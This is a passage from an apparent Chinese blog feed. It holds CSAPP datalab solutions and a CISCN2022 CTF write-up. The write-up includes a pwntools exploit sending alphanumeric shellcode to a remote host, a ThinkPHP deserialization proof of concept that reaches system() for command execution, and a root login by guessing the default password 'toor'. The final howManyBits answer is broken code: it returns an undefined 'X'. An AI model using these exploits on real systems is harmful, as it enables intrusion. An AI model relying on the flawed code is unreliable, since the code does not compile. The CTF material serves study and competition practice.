class="number">31</span>)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题挺难的，首先要想到一个二分，然后要注意正数需要多一位，负数不需要。假如我给了你 <code>0x7fffffff</code>，那么你肯定要 <code>32</code> 位，虽然我只有 <code>31</code> 位有效数字。我给你个 <code>-1</code> 那一位就够了，因为一位的范围就是 <code>-1~0</code>。</p><p>我们先判断高 <code>16</code> 位是否有 <code>1</code>，若有则判断高 <code>16</code> 位，答案加上 <code>16</code>，否则判断低 <code>16</code> 位。</p><p>再判断的 <code>16</code> 位中，判断高 <code>8</code> 位是否有 <code>1</code>，若有则继续判断高 <code>8</code> 位，答案加上<code>8</code>，否则判断低 <code>8</code> 位。</p><p>直到判完。我一开始想到了这个：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> sign=!(&gt;&gt;<span class="number">31</span>); </span><br><span class="line"><span class="keyword">int</span> b16=(!!((x&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>))&lt;&lt;<span class="number">4</span>;</span><br><span class="line">x=x&gt;&gt;b16;</span><br><span class="line">x=x&amp;<span class="number">0xffff</span>;</span><br><span class="line"><span class="keyword">int</span> b8=(!!((x&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))&lt;&lt;<span class="number">3</span>;</span><br><span class="line">x=x&gt;&gt;b8;</span><br><span class="line"><span class="keyword">int</span> b4=(!!((x&gt;&gt;<span class="number">4</span>)&amp;<span class="number">0xf</span>))&lt;&lt;<span class="number">2</span>;</span><br><span class="line">x=x&gt;&gt;b4;</span><br><span class="line"><span class="keyword">int</span> b2=(!!((x&gt;&gt;<span class="number">2</span>)&amp;<span class="number">0x3</span>))&lt;&lt;<span class="number">1</span>;</span><br><span class="line">x=x&gt;&gt;b2;</span><br><span class="line"><span class="keyword">int</span> b1=(!!((x&gt;&gt;<span class="number">1</span>)&amp;<span class="number">0x1</span>))&lt;&lt;<span class="number">0</span>;</span><br><span class="line">x=x&gt;&gt;b1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d %d %d %d\n&quot;</span>,b16,b8,b4,b2,b1,x,sign);</span><br><span class="line"><span class="keyword">return</span> b16+b8+b4+b2+b1+sign+x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是经过多方调试还是输给了 <code>-1</code> 这个测试点。后来想到如果负数则取反即可，然后符号位就默认给它加着上去即可。</p><h4 id="答案-7"><a href="#答案-7" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> sign=x&gt;&gt;<span class="number">31</span>;</span><br><span class="line">x = (sign&amp;~x)|(~sign&amp;x);</span><br><span class="line"><span class="keyword">int</span> b16=(!!((x&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>))&lt;&lt;<span class="number">4</span>;</span><br><span class="line">x=x&gt;&gt;b16;</span><br><span class="line">x=x&amp;<span class="number">0xffff</span>;</span><br><span class="line"><span class="keyword">int</span> b8=(!!((x&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))&lt;&lt;<span class="number">3</span>;</span><br><span class="line">x=x&gt;&gt;b8;</span><br><span class="line"><span class="keyword">int</span> b4=(!!((x&gt;&gt;<span class="number">4</span>)&amp;<span class="number">0xf</span>))&lt;&lt;<span class="number">2</span>;</span><br><span class="line">x=x&gt;&gt;b4;</span><br><span class="line"><span class="keyword">int</span> b2=(!!((x&gt;&gt;<span class="number">2</span>)&amp;<span class="number">0x3</span>))&lt;&lt;<span class="number">1</span>;</span><br><span class="line">x=x&gt;&gt;b2;</span><br><span class="line"><span class="keyword">int</span> b1=(!!((x&gt;&gt;<span class="number">1</span>)&amp;<span class="number">0x1</span>))&lt;&lt;<span class="number">0</span>;</span><br><span class="line">x=x&gt;&gt;b1;</span><br><span class="line"><span class="keyword">return</span> b16+b8+b4+b2+b1+X+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整数阶段到此完结了就。</p><h3 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是返回一个浮点数乘 <code>2</code>。首先排除掉那些特殊值： <code>NAN，INF</code> 和 <code>0</code>，乘二返回指数 <code>+1</code> 即可，</p><h4 id="答案-8"><a href="#答案-8" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">exp</span> = (uf&amp;<span class="number">0x7f800000</span>)&gt;&gt;<span class="number">23</span>;</span><br><span class="line"><span class="keyword">int</span> sign = uf&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>==<span class="number">0</span>) <span class="keyword">return</span> uf&lt;&lt;<span class="number">1</span>|sign;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>==<span class="number">255</span>) <span class="keyword">return</span> uf;</span><br><span class="line"><span class="built_in">exp</span>++;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>==<span class="number">255</span>) <span class="keyword">return</span> <span class="number">0x7f800000</span>|sign;</span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">exp</span>&lt;&lt;<span class="number">23</span>)|(uf&amp;<span class="number">0x807fffff</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现一个类似是强制转换的东西吧，首先还是按照浮点数的规则把各个字段提取出来，然后特判移位就行了。</p><h4 id="答案-9"><a href="#答案-9" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> s=uf&gt;&gt;<span class="number">31</span>;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">exp</span>=((uf&amp;<span class="number">0x7f800000</span>)&gt;&gt;<span class="number">23</span>)<span class="number">-127</span>;</span><br><span class="line"><span class="keyword">int</span> frac=(uf&amp;<span class="number">0x007fffff</span>)|<span class="number">0x00800000</span>;</span><br><span class="line"><span class="keyword">if</span>(!(uf&amp;<span class="number">0x7fffffff</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>&gt;<span class="number">31</span>)<span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>&gt;<span class="number">23</span>)frac&lt;&lt;=(<span class="built_in">exp</span><span class="number">-23</span>);</span><br><span class="line"><span class="keyword">else</span> frac&gt;&gt;=(<span class="number">23</span>-<span class="built_in">exp</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!((frac&gt;&gt;<span class="number">31</span>)^s)) <span class="keyword">return</span> frac;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(frac&gt;&gt;<span class="number">31</span>) <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> ~frac+<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现运算 <code>pow(2,x)</code>，返回结果为 <code>int</code> 虽然我们可以直接 <code>1&lt;&lt;x</code>，但是它要求浮点计算。</p><p>首先防止溢出先判断，因为是 <code>2</code> 的整数次方，所以它的结果就是 <code>(exp+127)&lt;&lt;23</code>，然后判断无穷小和溢出即可，这个比较简单。</p><h4 id="答案-10"><a href="#答案-10" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> INF = <span class="number">0xff</span>&lt;&lt;<span class="number">23</span>;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exp</span> = x + <span class="number">127</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span> &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span> &gt;= <span class="number">255</span>) <span class="keyword">return</span> INF;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意，由于最后一个题目测试数据比较多，因此要修改时限才能通过。我也不知道我算法有什么问题，这 <code>O(1)</code> 的复杂度也不知道上哪优化去。</p><h3 id="result"><a href="#result" class="headerlink" title="result"></a>result</h3><p><img src="/2022/06/03/CSAPP_Datalab/6.png" alt="6"></p><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>啥也不说了 <code>CSAPP</code> 永远的神，入门二进制必备书籍，二刷都能感觉学到了很多以前没学到的东西，接下来没以前认真看的也都得去看一遍了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;之前 &lt;code&gt;CS:APP&lt;/code&gt; 没有好好学，今天下定决心来重新看一遍，并把实验好好做一遍以巩固自身。&lt;/p&gt;</summary>
    
    
    
    <category term="csapp" scheme="http://example.com/categories/csapp/"/>
    
    <category term="信息的表示处理" scheme="http://example.com/categories/csapp/%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%A4%84%E7%90%86/"/>
    
    
  </entry>
  
  <entry>
    <title>CISCN2022 初赛WP</title>
    <link href="http://example.com/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/"/>
    <id>http://example.com/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/</id>
    <published>2022-05-31T16:00:00.000Z</published>
    <updated>2022-06-01T15:05:44.604Z</updated>
    
    <content type="html"><![CDATA[<p>咕了有点久了，来发一下</p><span id="more"></span><h1 id="CISCN2022初赛WP"><a href="#CISCN2022初赛WP" class="headerlink" title="CISCN2022初赛WP"></a>CISCN2022初赛WP</h1><h2 id="一、-战队信息"><a href="#一、-战队信息" class="headerlink" title="一、 战队信息"></a>一、 战队信息</h2><p><strong>战队名称：flag虽不能至，然心向往之</strong></p><p><strong>战队排名：第130名</strong></p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/image-20220529204836288.png" alt="image-20220529204836288"></p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/image-20220529204847304.png" alt="image-20220529204847304"></p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/image-20220529204852556.png" alt="image-20220529204852556"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="签到电台"><a href="#签到电台" class="headerlink" title="签到电台"></a>签到电台</h3><p>根据题目的提示从公众号获取两个hint：</p><ol><li><p>在“标准电码表”找“弼时安全到达了”所对应的7个电码，再跟“密码本”的前7*4个数字分别逐位进行“模十算法”（加不进位、减不借位），所得到的就是要发送的电码。发送电码前先发送“s”启动，即按3个“.”，这个发送电报的过程可以使用抓包软件进行抓取，可方便输入电报。</p></li><li><p>“弼时安全到达了”所对应的7个电码：1732 2514 1344 0356 0451 6671 0055。模十算法示例：1732与6378得到7000，发包示例：/send?msg=s</p></li></ol><p>然后访问/secret看到密码，取前28个做模10运算，再用hint2的发包方式发送得到flag。</p><h3 id="基于挑战码的双向认证"><a href="#基于挑战码的双向认证" class="headerlink" title="基于挑战码的双向认证"></a>基于挑战码的双向认证</h3><p>这题给了 <code>ssh</code>，有权限就想着先连一下，连上去之后试试 <code>find / | grep &quot;flag.txt&quot; </code>找到一个类似 <code>flag</code>的东西，但是不是 <code>flag</code>，此时又看到两个题目是连着的，所以就猜测应该是 <code>flag1.txt</code> 和 <code>flag2.txt</code>。寻找之后发现 <code>/root/cube-shell/instance/flag_server/</code> 目录下存在，然后就直接拿到两个题目的 <code>flag</code> 了。</p><h3 id="基于挑战码的双向认证3"><a href="#基于挑战码的双向认证3" class="headerlink" title="基于挑战码的双向认证3"></a>基于挑战码的双向认证3</h3><p>有了前两道题目的铺垫之后，又试了试查看该目录下的 <code>flag</code> 发现权限不够，然后就尝试提权，直接试试看默认密码，随便输了几个试到了 <code>toor</code> 直接就提权了，然后拿下flag。</p><h3 id="ISO9798"><a href="#ISO9798" class="headerlink" title="ISO9798"></a>ISO9798</h3><p>链接靶机，有pow，爆破即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">hash</span>=<span class="string">&#x27;ed8e248b4ec6828ea8f2cda56293484cbff40d934aba1e641cc3fcbf94e1757c&#x27;</span></span><br><span class="line">sss=<span class="string">&#x27;Eee9sVQumMWXoLEL&#x27;</span></span><br><span class="line">table=<span class="string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ch1 <span class="keyword">in</span> table:</span><br><span class="line">    <span class="keyword">for</span> ch2 <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> ch3 <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">for</span> ch4 <span class="keyword">in</span> table:</span><br><span class="line">                hashvalue=sha256((ch1+ch2+ch3+ch4+sss).encode()).hexdigest()</span><br><span class="line">                <span class="keyword">if</span> hashvalue==<span class="built_in">hash</span>:</span><br><span class="line">                    <span class="built_in">print</span>(ch1+ch2+ch3+ch4)</span><br><span class="line">                    quit()</span><br></pre></td></tr></table></figure><p>然后输入32个0过第二步</p><p>返回一长串字符串</p><p>4993ad5ec5dfd5147003438c0e6afd696b026f48fb9676d625dbb6e2b1536b803c4d2e0a001b998f0d6afcb063e71fd8</p><p><img src="file:///C:/Users/XIA0JI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="img">根据提示分成ra,rb,k</p><p>ra=4993ad5ec5dfd5147003438c0e6afd69</p><p>rb=6b026f48fb9676d625dbb6e2b1536b80</p><p>K=3c4d2e0a001b998f0d6afcb063e71fd8</p><p>然后组合一下rb+ra为</p><p>6b026f48fb9676d625dbb6e2b1536b804993ad5ec5dfd5147003438c0e6afd69</p><p>打入出flag</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>漏洞点在选项2，选项2用 <code>mmap</code> 开辟了一个可读可写可执行的内存，并可以往上面写东西，并且执行过去，那么就确定要在上面写 <code>shellcode</code>，但是之前有三个check，后两个经过交叉引用可知在选项 <code>1</code> 中给 <code>ro0t</code> 可以将它置为1，于是我们就先用选项 <code>1</code> 置为1，再用选项 <code>2</code> 去写 <code>shellcode</code>，但是每个字节都有 <code>isprint</code> 的 <code>check</code>，那好办，就直接写 <code>alphanumeric shellcode</code>。</p><p>在下面这个文章中找到用的shellcode </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/Y_peak/article/details/115307573</span><br></pre></td></tr></table></figure><p>然后写出exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io=process(&#x27;./login&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;101.201.123.35&#x27;</span>,<span class="number">27290</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;opt:1\r\nmsg:ro0t\r\n&#x27;</span>)</span><br><span class="line">code = <span class="string">b&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;opt:2\r\nmsg:&#x27;</span>+code+<span class="string">b&#x27;\r\n&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>TP的新链子，具体漏洞分析在这：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/vuls/321546.html</span><br></pre></td></tr></table></figure><p>下图可见在/index.php/Index/test POST传序列化字符串给a即可</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1.png" alt="1"></p><p>POC在此，ls一下再读下flag即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">lazySave</span> = <span class="title">false</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$json</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$jsonAssoc</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">True</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;ls&#x27;</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists = <span class="literal">True</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;system&#x27;</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;json = [<span class="string">&#x27;whoami&#x27;</span>,[<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;jsonAssoc = <span class="literal">True</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span>(<span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>(<span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>()))));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="baby-tree"><a href="#baby-tree" class="headerlink" 